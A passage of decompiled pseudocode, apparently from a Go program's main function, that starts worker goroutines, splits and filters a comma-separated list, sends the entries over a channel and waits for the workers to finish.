      v133 = sub_4CF280();
      if ( v133 != 0 )
      {
        v285 = v4;
        v283 = &unk_50FEE0;
        v284 = &off_569AD0;
        *(_QWORD *)&v285 = *(_QWORD *)(v133 + 8);
        *((_QWORD *)&v285 + 1) = v124;
        fmt_Fprintln();
        os_Exit();
      }
      os_Exit();
      if ( *v256 > 0 )
        sub_46E780();
      sub_4FA7E0();
      sub_4FA3A0();
      sub_4F7BE0();
      sub_4F7CC0();
      sub_4FD120();
      sub_4FD440();
      sub_4FD720();
      sub_4FD960();
      v134 = off_6BE1C0;
      v135 = sub_4D8760();
      if ( v137 != 0 )
      {
        v281 = &unk_50FEE0;
        v282 = &off_569AE0;
        return fmt_Fprintln();
      }
      else
      {
        v231 = v136;
        v264 = v135;
        v230 = v134;
        v247 = dword_70D32C;
        v233 = 3LL * dword_70D32C;
        sub_40B480();
        v278 = v138;
        v139 = 500;
        v221 = sub_40B480();
        v277 = v140;
        v141 = (_QWORD *)runtime_newobject();
        if ( dword_70D560 != 0 )
        {
          v141 = (_QWORD *)sub_4725A0(a1: v142);
          v143 = v278;
          *v145 = v278;
          v144 = v277;
          v145[1] = v277;
        }
        else
        {
          v143 = v278;
          v144 = v277;
        }
        v251 = v141;
        *v141 = v143;
        v141[1] = v144;
        v146 = 2 * v247;
        v227 = 2 * v247;
        for ( i = 0; i < v146; i = v247 )
        {
          v242 = i;
          sub_479D40();
          v247 = v242 + 1;
          v279 = off_6BE1B0;
          v246 = qword_6BE1B8;
          v148 = (_QWORD *)runtime_newobject();
          *v148 = sub_4FCE20;
          v148[1] = v247;
          if ( dword_70D560 != 0 )
          {
            v148 = (_QWORD *)sub_4725A0(a1: v149);
            v139 = (__int64)v251;
            *v151 = v251;
            v150 = v279;
            v151[1] = v279;
          }
          else
          {
            v139 = (__int64)v251;
            v150 = v279;
          }
          v148[2] = v139;
          v148[4] = v246;
          v148[3] = v150;
          sub_4465E0();
          v146 = v227;
        }
        for ( j = 0; j < v233; j = v247 )
        {
          v241 = j;
          sub_479D40();
          v247 = v241 + 1;
          v224 = *v255;
          v153 = runtime_newobject();
          *(_QWORD *)v153 = sub_4FCDC0;
          *(_QWORD *)(v153 + 8) = v247;
          if ( dword_70D560 != 0 )
          {
            v153 = sub_4725A0(a1: v154);
            v139 = (__int64)v251;
            *v156 = v251;
            v155 = v264;
            v156[1] = v264;
          }
          else
          {
            v139 = (__int64)v251;
            v155 = v264;
          }
          *(_QWORD *)(v153 + 16) = v139;
          *(_QWORD *)(v153 + 32) = v230;
          *(_QWORD *)(v153 + 40) = v231;
          *(_QWORD *)(v153 + 24) = v155;
          *(_BYTE *)(v153 + 48) = v224;
          sub_4465E0();
        }
        if ( *v253 != 0 )
        {
          v169 = sub_4FCE80();
          v247 = v139;
          v246 = v170;
          v276 = v169;
          v171 = sub_4FDF20();
          v172 = v247 + v139;
          if ( v246 < v247 + v139 )
          {
            v246 = v139;
            v275 = v171;
            v174 = v139;
            v175 = v247 + v139;
            v176 = runtime_growslice(a1: v174, a2: &unk_50FEE0);
            v172 = v175;
            v173 = v176;
          }
          else
          {
            v173 = v276;
          }
          v235 = v172;
          v267 = (_QWORD *)v173;
          runtime_typedslicecopy(a1: v221, a2: v222, a3: v223);
          v177 = v267;
          v178 = v235;
        }
        else
        {
          v157 = (__int64)v257[1];
          if ( v157 != 0 )
          {
            v167 = sub_4C8180(a1: 1, a2: 0, a3: v257, a4: ",", a5: -1);
            v168 = 0;
            v166 = nullptr;
            v165 = 0;
            while ( v157 > 0 )
            {
              v247 = v157;
              v267 = v166;
              v235 = v165;
              v236 = v168;
              v280 = (_QWORD *)v167;
              v185 = *(_QWORD *)(v167 + 8);
              v186 = strings_TrimSpace();
              if ( v185 != 0 )
              {
                v234 = v185;
                v266 = v186;
                v190 = v235 + 1;
                v191 = v236;
                if ( v236 < v235 + 1 )
                {
                  v193 = v235 + 1;
                  v192 = runtime_growslice(a1: 1, a2: &unk_50FEE0);
                  v190 = v193;
                  v186 = v266;
                  v185 = v234;
                }
                else
                {
                  v192 = (__int64)v267;
                }
                v246 = v190;
                v236 = v191;
                v194 = 16 * (v190 - 1);
                *(_QWORD *)(v192 + v194 + 8) = v185;
                if ( dword_70D560 != 0 )
                {
                  v186 = sub_4725A0(a1: v194);
                  *v195 = v186;
                  v195[1] = *(_QWORD *)(v192 + v194);
                }
                v276 = v192;
                *(_QWORD *)(v192 + v194) = v186;
                v196 = (_QWORD *)sub_4FE5A0();
                v197 = v234;
                v187 = v246;
                v189 = v276;
                v188 = v236;
                while ( v185 > 0 )
                {
                  v246 = v185;
                  v275 = v189;
                  v245 = v188;
                  v244 = v187;
                  v274 = v196;
                  v198 = v196[1];
                  v243 = v198;
                  v199 = *v196;
                  v273 = *v196;
                  if ( v197 <= v198 )
                  {
                    v201 = sub_4033C0();
                    v197 = v234;
                    v187 = v244;
                    v185 = v246;
                    v189 = v275;
                    v188 = v245;
                    v198 = v243;
                    v199 = v273;
                    v200 = v201;
                    v196 = v274;
                  }
                  else
                  {
                    v200 = 0;
                  }
                  if ( v200 != 0 )
                  {
                    if ( v197 == v198 )
                    {
                      v203 = sub_4033C0();
                      v197 = v234;
                      v187 = v244;
                      v185 = v246;
                      v189 = v275;
                      v188 = v245;
                      v198 = v243;
                      v199 = v273;
                      v202 = v203 ^ 1;
                      v196 = v274;
                    }
                    else
                    {
                      v202 = 1;
                    }
                  }
                  else
                  {
                    v202 = 0;
                  }
                  if ( v202 != 0 )
                  {
                    if ( v188 < ++v187 )
                    {
                      v204 = v187;
                      v205 = runtime_growslice(a1: 1, a2: &unk_50FEE0);
                      v198 = v243;
                      v199 = v273;
                      v189 = v205;
                      v187 = v204;
                      v188 = v206;
                      v196 = v274;
                      v197 = v234;
                      v185 = v246;
                    }
                    v207 = 16 * (v187 - 1);
                    *(_QWORD *)(v189 + v207 + 8) = v198;
                    if ( dword_70D560 != 0 )
                    {
                      v196 = (_QWORD *)sub_4725A0(a1: v188);
                      *v208 = v199;
                      v208[1] = *(_QWORD *)(v189 + v207);
                    }
                    *(_QWORD *)(v189 + v207) = v199;
                  }
                  v196 += 2;
                  --v185;
                }
              }
              else
              {
                v187 = v235;
                v188 = v236;
                v189 = (__int64)v267;
              }
              v167 = (__int64)(v280 + 2);
              v157 = v247 - 1;
              v168 = v188;
              v184 = v187;
              v166 = (_QWORD *)v189;
              v165 = v184;
            }
          }
          else
          {
            v158 = sub_4FE5A0();
            v247 = 0;
            v246 = v159;
            v276 = v158;
            v160 = sub_4FDF20();
            v161 = v247;
            if ( v246 < v247 )
            {
              v246 = 0;
              v275 = v160;
              v163 = v247;
              v164 = runtime_growslice(a1: 0, a2: &unk_50FEE0);
              v161 = v163;
              v162 = v164;
            }
            else
            {
              v162 = v276;
            }
            v235 = v161;
            v267 = (_QWORD *)v162;
            runtime_typedslicecopy(a1: v221, a2: v222, a3: v223);
            v165 = v235;
            v166 = v267;
          }
          v177 = v166;
          v178 = v165;
        }
        while ( v178 > 0 )
        {
          v247 = v178;
          v280 = v177;
          v179 = v177[1];
          v302 = *v177;
          v303 = v179;
          runtime_chansend1();
          v177 = v280 + 2;
          v178 = v247 - 1;
        }
        sub_40C040();
        v180 = (_QWORD *)runtime_newobject();
        *v180 = sub_4FCD60;
        if ( dword_70D560 != 0 )
        {
          v180 = (_QWORD *)sub_472580(a1: v181);
          v182 = v251;
          *v183 = v251;
        }
        else
        {
          v182 = v251;
        }
        v180[1] = v182;
        sub_4465E0();
        sync__ptr_WaitGroup_Wait();
        sub_4FEE40();
        if ( *v255 == 0 )
          sub_4F7A00();
        return sub_4FA9C0();
      }
    }
  }
  else
  {
    v292[26] = &unk_50FEE0;
    v292[27] = &off_569A80;
    return fmt_Fprintln();
  }
}